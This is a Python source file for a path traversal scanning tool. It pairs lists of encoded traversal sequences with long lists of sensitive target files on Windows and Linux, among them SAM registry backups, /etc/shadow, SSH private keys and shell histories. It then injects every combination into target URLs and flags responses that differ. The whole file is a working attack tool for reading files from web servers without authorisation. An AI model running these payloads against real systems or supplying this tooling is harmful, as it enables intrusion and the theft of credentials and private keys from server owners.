import requests, sys
from core.core import msg
from core.validate import formats
from pathlib import Path
import concurrent.futures
from urllib.parse import urlparse, urlunparse
import posixpath

class payloads:
    encoded_traversal_strings = [
        "/",
        "../",
        "..\\",
        "..\/",
        "....//",
        "%2e%2e%2f",
        "..%252f",
        "%252e%252e%252f",
        "%c0%ae%c0%ae%c0%af",
        "%uff0e%uff0e%u2215",
        "%uff0e%uff0e%u2216",
        "..././",
        "...\.\\",
        "%2E%2E%2E%2E%2F%2F",
        ".%2e/",
        "....////",
        "....\/\/",
        "%%32%65%%32%65/"
    ]

    windows_file_disclosure = [
        "c:/apache/logs/access.log",
        "c:/apache/logs/error.log",
        "c:/apache/php/php.ini",
        "c:/boot.ini",
        "c:/MySQL/data/mysql.err",
        "c:/MySQL/data/mysql.log",
        "c:/MySQL/my.cnf",
        "c:/Users/Administrator/NTUser.dat",
        "c:/MySQL/my.cnf",
        "c:/MySQL/my.ini",
        "c:/php4/php.ini",
        "c:/php5/php.ini",
        "c:/php/php.ini",
        "c:/Program Files/Apache Group/Apache2/conf/httpd.conf",
        "c:/Program Files/Apache Group/Apache/conf/httpd.conf",
        "c:/Program Files/Apache Group/Apache/logs/access.log",
        "c:/Program Files/Apache Group/Apache/logs/error.log",
        "c:/Program Files/FileZilla Server/FileZilla Server.xml",
        "c:/Program Files/MySQL/data/hostname.err",
        "c:/Program Files/MySQL/data/mysql-bin.log",
        "c:/Program Files/MySQL/data/mysql.err",
        "c:/Program Files/MySQL/data/mysql.log",
        "c:/Program Files/MySQL/my.ini",
        "c:/Program Files/MySQL/my.cnf",
        "c:/Program Files/MySQL/MySQL Server 5.0/data/hostname.err",
        "c:/Program Files/MySQL/MySQL Server 5.0/data/mysql-bin.log",
        "c:/Program Files/MySQL/MySQL Server 5.0/data/mysql.err",
        "cC:/Program Files/MySQL/MySQL Server 5.0/data/mysql.log",
        "c:/Program Files/MySQL/MySQL Server 5.0/my.cnf",
        "c:/Program Files/MySQL/MySQL Server 5.0/my.ini",
        "c:/Program Files (x86)/Apache Group/Apache2/conf/httpd.conf",
        "c:/Program Files (x86)/Apache Group/Apache/conf/httpd.conf",
        "c:/Program Files (x86)/Apache Group/Apache/conf/access.log",
        "c:/Program Files (x86)/Apache Group/Apache/conf/error.log",
        "c:/Program Files (x86)/FileZilla Server/FileZilla Server.xml",
        "c:/Program Files (x86)/xampp/apache/conf/httpd.conf",
        "c:/WINDOWS/php.ini",
        "c:/WINDOWS/Repair/SAM",
        "c:/Windows/repair/system",
        "c:/Windows/repair/software",
        "c:/Windows/repair/security",
        "c:/WINDOWS/System32/drivers/etc/hosts",
        "c:/Windows/win.ini",
        "c:/WINNT/php.ini",
        "c:/WINNT/win.ini",
        "c:/xampp/apache/bin/php.ini",
        "c:/xampp/apache/logs/access.log",
        "c:/xampp/apache/logs/error.log",
        "c:/Windows/Panther/Unattend/Unattended.xml",
        "c:/Windows/Panther/Unattended.xml",
        "c:/Windows/debug/NetSetup.log",
        "c:/Windows/system32/config/AppEvent.Evt",
        "c:/Windows/system32/config/SecEvent.Evt",
        "c:/Windows/system32/config/default.sav",
        "c:/Windows/system32/config/security.sav",
        "c:/Windows/system32/config/software.sav",
        "c:/Windows/system32/config/system.sav",
        "c:/Windows/system32/config/regback/default",
        "c:/Windows/system32/config/regback/sam",
        "c:/Windows/system32/config/regback/security",
        "c:/Windows/system32/config/regback/system",
        "c:/Windows/system32/config/regback/software",
        "c:/Program Files/MySQL/MySQL Server 5.1/my.ini",
        "c:/Windows/System32/inetsrv/config/schema/ASPNET_schema.xml",
        "c:/Windows/System32/inetsrv/config/applicationHost.config",
    ]

    linux_file_disclosure = [
        "etc/passwd",
        "etc/passwd%00.png",
        "etc/passwd%00.jpg",
        "etc/passwd%00.php",
        "etc/passwd%00.html"
        "etc/shadow",
        "etc/aliases",
        "etc/anacrontab",
        "etc/apache2/apache2.conf",
        "etc/apache2/httpd.conf",
        "etc/at.allow",
        "etc/at.deny",
        "etc/bashrc",
        "etc/bootptab",
        "etc/chrootUsers",
        "etc/chttp.conf",
        "etc/cron.allow",
        "etc/cron.deny",
        "etc/crontab",
        "etc/cups/cupsd.conf",
        "etc/exports",
        "etc/fstab",
        "etc/ftpaccess",
        "etc/ftpchroot",
        "etc/ftphosts",
        "etc/groups",
        "etc/grub.conf",
        "etc/hosts",
        "etc/hosts.allow",
        "etc/hosts.deny",
        "etc/httpd/access.conf",
        "etc/httpd/conf/httpd.conf",
        "etc/httpd/httpd.conf",
        "etc/httpd/logs/access_log",
        "etc/httpd/logs/access.log",
        "etc/httpd/logs/error_log",
        "etc/httpd/logs/error.log",
        "etc/httpd/php.ini",
        "etc/httpd/srm.conf",
        "etc/inetd.conf",
        "etc/inittab",
        "etc/issue",
        "etc/lighttpd.conf",
        "etc/lilo.conf",
        "etc/logrotate.d/ftp",
        "etc/logrotate.d/proftpd",
        "etc/logrotate.d/vsftpd.log",
        "etc/lsb-release",
        "etc/motd",
        "etc/modules.conf",
        "etc/motd",
        "etc/mtab",
        "etc/my.cnf",
        "etc/my.conf",
        "etc/mysql/my.cnf",
        "etc/network/interfaces",
        "etc/networks",
        "etc/npasswd",
        "etc/passwd",
        "etc/php4.4/fcgi/php.ini",
        "etc/php4/apache2/php.ini",
        "etc/php4/apache/php.ini",
        "etc/php4/cgi/php.ini",
        "etc/php4/apache2/php.ini",
        "etc/php5/apache2/php.ini",
        "etc/php5/apache/php.ini",
        "etc/php/apache2/php.ini",
        "etc/php/apache/php.ini",
        "etc/php/cgi/php.ini",
        "etc/php.ini",
        "etc/php/php4/php.ini",
        "etc/php/php.ini",
        "etc/printcap",
        "etc/profile",
        "etc/proftp.conf",
        "etc/proftpd/proftpd.conf",
        "etc/pure-ftpd.conf",
        "etc/pureftpd.passwd",
        "etc/pureftpd.pdb",
        "etc/pure-ftpd/pure-ftpd.conf",
        "etc/pure-ftpd/pure-ftpd.pdb",
        "etc/pure-ftpd/putreftpd.pdb",
        "etc/redhat-release",
        "etc/resolv.conf",
        "etc/samba/smb.conf",
        "etc/snmpd.conf",
        "etc/ssh/ssh_config",
        "etc/ssh/sshd_config",
        "etc/ssh/ssh_host_dsa_key",
        "etc/ssh/ssh_host_dsa_key.pub",
        "etc/ssh/ssh_host_key",
        "etc/ssh/ssh_host_key.pub",
        "etc/sysconfig/network",
        "etc/syslog.conf",
        "etc/termcap",
        "etc/vhcs2/proftpd/proftpd.conf",
        "etc/vsftpd.chroot_list",
        "etc/vsftpd.conf",
        "etc/vsftpd/vsftpd.conf",
        "etc/wu-ftpd/ftpaccess",
        "etc/wu-ftpd/ftphosts",
        "etc/wu-ftpd/ftpusers",
        "logs/pure-ftpd.log",
        "logs/security_debug_log",
        "logs/security_log",
        "opt/lampp/etc/httpd.conf",
        "opt/xampp/etc/php.ini",
        "proc/cpuinfo",
        "proc/filesystems",
        "proc/interrupts",
        "proc/ioports",
        "proc/meminfo",
        "proc/modules",
        "proc/mounts",
        "proc/stat",
        "proc/swaps",
        "proc/version",
        "proc/self/net/arp",
        "root/anaconda-ks.cfg",
        "usr/etc/pure-ftpd.conf",
        "usr/lib/php.ini",
        "usr/lib/php/php.ini",
        "usr/local/apache/conf/modsec.conf",
        "usr/local/apache/conf/php.ini",
        "usr/local/apache/log",
        "usr/local/apache/logs",
        "usr/local/apache/logs/access_log",
        "usr/local/apache/logs/access.log",
        "usr/local/apache/audit_log",
        "usr/local/apache/error_log",
        "usr/local/apache/error.log",
        "usr/local/cpanel/logs",
        "usr/local/cpanel/logs/access_log",
        "usr/local/cpanel/logs/error_log",
        "usr/local/cpanel/logs/license_log",
        "usr/local/cpanel/logs/login_log",
        "usr/local/cpanel/logs/stats_log",
        "usr/local/etc/httpd/logs/access_log",
        "usr/local/etc/httpd/logs/error_log",
        "usr/local/etc/php.ini",
        "usr/local/etc/pure-ftpd.conf",
        "usr/local/etc/pureftpd.pdb",
        "usr/local/lib/php.ini",
        "usr/local/php4/httpd.conf",
        "usr/local/php4/httpd.conf.php",
        "usr/local/php4/lib/php.ini",
        "usr/local/php5/httpd.conf",
        "usr/local/php5/httpd.conf.php",
        "usr/local/php5/lib/php.ini",
        "usr/local/php/httpd.conf",
        "usr/local/php/httpd.conf.ini",
        "usr/local/php/lib/php.ini",
        "usr/local/pureftpd/etc/pure-ftpd.conf",
        "usr/local/pureftpd/etc/pureftpd.pdn",
        "usr/local/pureftpd/sbin/pure-config.pl",
        "usr/local/www/logs/httpd_log",
        "usr/local/Zend/etc/php.ini",
        "usr/sbin/pure-config.pl",
        "var/adm/log/xferlog",
        "var/apache2/config.inc",
        "var/apache/logs/access_log",
        "var/apache/logs/error_log",
        "var/cpanel/cpanel.config",
        "var/lib/mysql/my.cnf",
        "var/lib/mysql/mysql/user.MYD",
        "var/local/www/conf/php.ini",
        "var/log/apache2/access_log",
        "var/log/apache2/access.log",
        "var/log/apache2/error_log",
        "var/log/apache2/error.log",
        "var/log/apache/access_log",
        "var/log/apache/access.log",
        "var/log/apache/error_log",
        "var/log/apache/error.log",
        "var/log/apache-ssl/access.log",
        "var/log/apache-ssl/error.log",
        "var/log/auth.log",
        "var/log/boot",
        "var/htmp",
        "var/log/chttp.log",
        "var/log/cups/error.log",
        "var/log/daemon.log",
        "var/log/debug",
        "var/log/dmesg",
        "var/log/dpkg.log",
        "var/log/exim_mainlog",
        "var/log/exim/mainlog",
        "var/log/exim_paniclog",
        "var/log/exim.paniclog",
        "var/log/exim_rejectlog",
        "var/log/exim/rejectlog",
        "var/log/faillog",
        "var/log/ftplog",
        "var/log/ftp-proxy",
        "var/log/ftp-proxy/ftp-proxy.log",
        "var/log/httpd/access_log",
        "var/log/httpd/access.log",
        "var/log/httpd/error_log",
        "var/log/httpd/error.log",
        "var/log/httpsd/ssl.access_log",
        "var/log/httpsd/ssl_log",
        "var/log/kern.log",
        "var/log/lastlog",
        "var/log/lighttpd/access.log",
        "var/log/lighttpd/error.log",
        "var/log/lighttpd/lighttpd.access.log",
        "var/log/lighttpd/lighttpd.error.log",
        "var/log/mail.info",
        "var/log/mail.log",
        "var/log/maillog",
        "var/log/mail.warn",
        "var/log/message",
        "var/log/messages",
        "var/log/mysqlderror.log",
        "var/log/mysql.log",
        "var/log/mysql/mysql-bin.log",
        "var/log/mysql/mysql.log",
        "var/log/mysql/mysql-slow.log",
        "var/log/proftpd",
        "var/log/pureftpd.log",
        "var/log/pure-ftpd/pure-ftpd.log",
        "var/log/secure",
        "var/log/vsftpd.log",
        "var/log/wtmp",
        "var/log/xferlog",
        "var/log/yum.log",
        "var/mysql.log",
        "var/run/utmp",
        "var/spool/cron/crontabs/root",
        "var/webmin/miniserv.log",
        "var/www/log/access_log",
        "var/www/log/error_log",
        "var/www/logs/access_log",
        "var/www/logs/error_log",
        "var/www/logs/access.log",
        "var/www/logs/error.log",
        "~/.atfp_history",
        "~/.bash_history",
        "~/.bash_logout",
        "~/.bash_profile",
        "~/.bashrc",
        "~/.gtkrc",
        "~/.login",
        "~/.logout",
        "~/.mysql_history",
        "~/.nano_history",
        "~/.php_history",
        "~/.profile",
        "~/.ssh/authorized_keys",
        "~/.ssh/id_dsa",
        "~/.ssh/id_dsa.pub",
        "~/.ssh/id_rsa",
        "~/.ssh/id_rsa.pub",
        "~/.ssh/identity",
        "~/.ssh/identity.pub",
        "~/.viminfo",
        "~/.wm_style",
        "~/.Xdefaults",
        "~/.xinitrc",
        "~/.Xresources",
        "~/.xsession",
    ]

    other_path = [
        "cgi-bin/"
    ]

class traversal:
    def __init__(self,target_url,target_url_file,timeout,follow_redirect,cookie,user_agent,tls_validation,proxy_setting,max_depth,target_os,threads,min_depth,verbose,custom_path=[],custom_traversal_strings=[]):
        self.target_url = target_url
        self.target_url_file = target_url_file
        self.timeout = int(timeout)
        self.follow_redirect = follow_redirect
        self.cookie = cookie
        self.user_agent = user_agent
        self.tls_validation = tls_validation
        self.proxy_setting = proxy_setting
        self.max_depth = int(max_depth)
        self.min_depth = int(min_depth)
        self.target_os = target_os
        self.threads = threads
        self.payloads_list = []
        self.count = 0
        self.count2 = 0
        self.detected = []
        self.verbose = verbose
        self.custom_traversal_strings = custom_traversal_strings
        self.custom_path = custom_path 

        
    def scanner(self):
        try:
            single_or_multiple_url = 0
            if self.target_url:
                msg.info(f"Starting single scan for url {self.target_url}")
                single_or_multiple_url = 0
            elif self.target_url_file:
                msg.info(f"Starting scan for URLs into the file {self.target_url_file}")
                single_or_multiple_url = 1
            elif self.min_depth > self.max_depth:
                msg.error("--min-depth cant be greater than --depth")
                sys.exit()
            else:
                msg.error("no url detected, use --url or --url-file args")
                sys.exit()

            if single_or_multiple_url == 1 :
                file = Path(self.target_url_file)
                if not file.is_file():
                    msg.error(f"file {self.target_url_file} not found!")
                    sys.exit()

                self.create_payloads()
                msg.success(f"[{self.count}] payloads have been loaded!")

                urls_from_file = open(self.target_url_file,"r").read()
                for url in urls_from_file.split("\n"):
                    if formats.validate_url(url):
                        msg.warning(f"Scanning url {url}")
                        with concurrent.futures.ThreadPoolExecutor(max_workers=int(self.threads)) as executor:
                            future_to_url = {executor.submit(self.check,url,payload): payload for payload in self.payloads_list}
                    
                            for future in concurrent.futures.as_completed(future_to_url):
                                future.result()

                msg.info("done!")
                
            else:
                if not formats.validate_url(self.target_url):
                    msg.error(f"url {self.target_url} is invalid!")
                    sys.exit()

                if self.is_alive(self.target_url):
                    msg.info(f"Connection success for url {self.target_url}")
                    self.create_payloads()
                    msg.success(f"[{self.count}] payloads have been loaded!")

                    with concurrent.futures.ThreadPoolExecutor(max_workers=int(self.threads)) as executor:
                        future_to_url = {executor.submit(self.check,self.target_url,payload): payload for payload in self.payloads_list}
                
                        for future in concurrent.futures.as_completed(future_to_url):
                            future.result()

                    msg.info("done!")
        except KeyboardInterrupt:
            msg.error("Stopped by user!")
            sys.exit()

    def payloads(self,os_payloads=[],traversal_string_list=[],path_list=[]):
        if int(self.min_depth) > int(self.max_depth):
            return

        for o in path_list:
            for s in traversal_string_list:
                for p in os_payloads:
                    data = f"{o}{s * self.min_depth}{p}"
                    self.payloads_list.append(data)
                    self.count = self.count + 1
        
        for s in traversal_string_list:
            for p in os_payloads:
                data = f"{s * self.min_depth}{p}"
                self.payloads_list.append(data)
                self.count = self.count + 1

        self.min_depth=self.min_depth+1
        self.payloads(os_payloads,traversal_string_list,path_list)

    
    def create_payloads(self):
        custom_traversal_strings_list = payloads.encoded_traversal_strings
        if self.custom_traversal_strings:
            msg.info("custom path traversal string detected")
            custom_traversal_strings_list = self.custom_traversal_strings

        custom_path_list = payloads.other_path
        if self.custom_path:
            msg.info("custom path detected")
            custom_path_list = self.custom_path

        if self.target_os.lower() =='linux':
            msg.info("Loading linux path traversal payloads")
            self.payloads(payloads.linux_file_disclosure,custom_traversal_strings_list,custom_path_list)
            
        elif self.target_os.lower() == 'windows':
            msg.info("Loading windows path traversal payloads")
            self.payloads(payloads.windows_file_disclosure,custom_traversal_strings_list,custom_path_list)
        else:
            msg.info("Loading linux and windows path traversal payloads")
            self.payloads(payloads.windows_file_disclosure,custom_traversal_strings_list,custom_path_list)
            self.payloads(payloads.linux_file_disclosure,custom_traversal_strings_list,custom_path_list)

    def is_alive(self,target_url):
        try:
            headers = {
                "User-Agent" : self.user_agent,
                "cookie" : self.cookie
            }

            proxy_setting = {
                "http" : None,
                "https" : None
            }

            if self.proxy_setting:
                proxy_setting = {
                    "http" : self.proxy_setting,
                    "https" : self.proxy_setting
                }
            res = requests.get(target_url,headers=headers,allow_redirects=self.follow_redirect, timeout=self.timeout, verify=self.tls_validation, proxies=proxy_setting)
            return True
        except Exception as e:
            msg.error(e)
            return False
        
    def check(self,url,payload):
        print(f"Running [{self.count2}/{self.count}]                 ",end="\r")

        if url in self.detected:
            return
        
        try:
            headers = {
                "User-Agent" : self.user_agent,
                "cookie" : self.cookie
            }

            proxy_setting = {
                "http" : None,
                "https" : None
            }

            if self.proxy_setting:
                proxy_setting = {
                    "http" : self.proxy_setting,
                    "https" : self.proxy_setting
                }

            response = requests.get(url,headers=headers,allow_redirects=self.follow_redirect, timeout=self.timeout, verify=self.tls_validation, proxies=proxy_setting)

            new_url = ""
            if "FUZZ" in url:
                new_url = url.replace("FUZZ",payload)
            else:
                parsed = urlparse(url)
                parsed = parsed._replace(query="")
                new_path = posixpath.join(posixpath.dirname(parsed.path), payload)
                new_parsed = parsed._replace(path=new_path)
                new_url = urlunparse(new_parsed)

            if self.verbose:
                msg.normal(new_url)

            response2 = requests.get(new_url,headers=headers,allow_redirects=self.follow_redirect, timeout=self.timeout, verify=self.tls_validation, proxies=proxy_setting)

            if response2.status_code == 200 and len(response.text) != len(response2.text):
                msg.warning(f"Interesting response detected at [{url}] with payload [{payload}], status code {response2.status_code} and Content-Length {len(response2.text)} != {len(response.text)} ")
                self.detected.append(url)
                msg.success(f"first 31 chars [{response2.text[0:31]}]")
        except Exception as e:
            pass
        self.count2 = self.count2 +1
        
        